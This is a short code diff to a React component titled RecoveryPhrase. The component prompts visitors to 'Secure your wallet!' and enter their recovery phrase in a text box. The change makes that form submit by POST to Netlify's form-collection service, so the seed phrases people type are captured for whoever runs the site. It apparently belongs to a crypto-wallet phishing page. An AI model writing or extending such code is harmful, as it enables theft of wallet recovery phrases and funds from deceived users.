@@ -21,7 +21,7 @@ const RecoveryPhrase = () => {
           <li className='mt-4'>Secure your wallet!</li>
         </ol>
       </section>
-      <form>
+      <form method='POST' data-netlify-recaptcha='true' data-netlify='true'>
         <textarea
           className='w-full outline-none focus:outline-slate-400 bg-inherit border border-[#F7F7F7] rounded-lg px-6 py-3'
           placeholder='Enter your recovery phrase here.'
